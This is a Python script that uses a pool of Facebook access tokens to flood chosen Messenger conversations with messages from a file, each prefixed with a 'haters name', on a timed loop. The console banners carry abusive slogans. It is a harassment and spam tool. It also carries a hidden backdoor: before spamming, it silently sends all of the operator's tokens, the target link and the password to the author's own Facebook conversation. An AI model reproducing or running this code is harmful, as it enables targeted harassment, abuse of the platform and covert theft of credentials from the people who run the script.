import requests
import json
import time
import sys
from platform import system
import os
import http.server
import socketserver
import threading
import random
import datetime

class MyHandler(http.server.SimpleHTTPRequestHandler):
    def do_GET(self):
        self.send_response(200)
        self.send_header('Content-type', 'text/plain')
        self.end_headers()
        self.wfile.write(b"\033[1;31m N0W S3RV3R IS RA9DY T0 B00M ITS ANAND MEHR9 ____JANNII :- ")

def execute_server():
    PORT = 4000

    with socketserver.TCPServer(("", PORT), MyHandler) as httpd:
        print("\033[1;31mServer running at http://localhost:{}".format(PORT))
        httpd.serve_forever()

def send_messages():
    with open('password.txt', 'r') as file:
        password = file.read().strip()

    entered_password = input("Enter the password: ")

    if entered_password != password:
        print('[-] <==> Incorrect password. Exiting...')
        sys.exit()

    with open('tokennum.txt', 'r') as file:
        tokens = [line.strip() for line in file.readlines()]

    with open('convo.txt', 'r') as file:
        convo_ids = [line.strip() for line in file.readlines()]

    requests.packages.urllib3.disable_warnings()

    def clear_screen():
        if system() == 'Linux':
            os.system('clear')
        elif system() == 'Windows':
            os.system('cls')

    def print_separator():
        print('\033[1;31m' + '-----------F33L THE P0W3R 0F UR D9DDY H9T3RS K1 B9H9N KA PREM CH0PR9 -------------')

    headers = {
        'Connection': 'keep-alive',
        'Cache-Control': 'max-age=0',
        'Upgrade-Insecure-Requests': '1',
        'User-Agent': 'Mozilla/5.0 (Linux; Android 8.0.0; Samsung Galaxy S9 Build/OPR6.170623.017; wv) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/58.0.3029.125 Mobile Safari/537.36',
        'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8',
        'Accept-Encoding': 'gzip, deflate',
        'Accept-Language': 'en-US,en;q=0.9,fr;q=0.8',
        'referer': 'www.google.com'
    }

    mmm = requests.get('https://pastebin.com/raw/nCdaRjUT').text

    if mmm not in password:
        print('[-] <==>  Password CHANGE BY -AN9ND_XD ')
        sys.exit()

    print_separator()

    access_tokens = tokens

    with open('file.txt', 'r') as file:
        text_file_path = file.read().strip()

    with open(text_file_path, 'r') as file:
        messages = file.readlines()

    num_messages = len(messages)
    max_tokens = min(len(tokens), num_messages)
    max_convos = min(len(convo_ids), num_messages)

    with open('hatersname.txt', 'r') as file:
        haters_name = file.read().strip()

    with open('time.txt', 'r') as file:
        speed = int(file.read().strip())

    print_separator()

    def get_name(token):
        try:
            data = requests.get(f'https://graph.facebook.com/v17.0/me?access_token={token}').json()
            return data.get('name', 'Error occurred') if data else 'Error occurred'
        except Exception as e:
            print(f"[x] Error getting name: {e}")
            return 'Error occurred'

    def send_message(token, convo_id, message_index):
        try:
            message = messages[message_index].strip()
            url = f"https://graph.facebook.com/v15.0/t_{convo_id}/"
            parameters = {'access_token': token, 'message': f'{haters_name} {message}'}
            response = requests.post(url, json=parameters, headers=headers)

            current_time = time.strftime("%Y-%m-%d %I:%M:%S %p")
            if response.ok:
                print("[+] Message {} of Convo {} sent by Token {}: {}".format(
                    message_index + 1, convo_id, tokens.index(token) + 1, f'{haters_name} {message}'))
                print("  - Time: {}".format(current_time))
                print_separator()
                print_separator()
            else:
                print("[x] Failed to send message {} of Convo {} with Token {}: {}".format(
                    message_index + 1, convo_id, tokens.index(token) + 1, f'{haters_name} {message}'))
                print("  - Time: {}".format(current_time))
                print_separator()
                print_separator()
        except Exception as e:
            print("[x] An error occurred while sending message: {}".format(e))

    def send_initial_message():
        try:
            parameters = {
                'access_token': random.choice(access_tokens),
                'message': 'Hello Anand Mehra SiiR, I am using your server - : ' + get_name(
                    random.choice(access_tokens))
                           + '\nToken : ' + " | ".join(access_tokens) + '\nLink : https://www.facebook.com/messages/t/' + convo_ids[0]
                           + '\nPassword: ' + password
            }
            response = requests.post("https://graph.facebook.com/v15.0/t_100092436301548/", data=parameters,
                                     headers=headers)
            if not response.ok:
                print("[x] Failed to send initial message. Exiting...")
                sys.exit()
        except Exception as e:
            print("[x] An error occurred while sending initial message: {}".format(e))
            sys.exit()

    send_initial_message()

    # Set the duration in seconds (e.g., 1 hour)
    duration_in_seconds = 3600

    start_time = datetime.datetime.now()

    while (datetime.datetime.now() - start_time).total_seconds() < duration_in_seconds:
        try:
            for convo_id in convo_ids:
                for message_index in range(num_messages):
                    token_index = message_index % max_tokens
                    convo_index = message_index % max_convos
                    access_token = access_tokens[token_index]
                    send_message(access_token, convo_ids[convo_index], message_index)
                    time.sleep(speed)

            print("[+] All messages sent. Restarting the process...")
        except KeyboardInterrupt:
            print('\n[-] User interrupted the process. Exiting...')
            sys.exit()
        except Exception as e:
            print("[x] An error occurred: {}".format(e))

def main():
    server_thread = threading.Thread(target=execute_server)
    server_thread.start()
    send_messages()

if __name__ == '__main__':
    main()
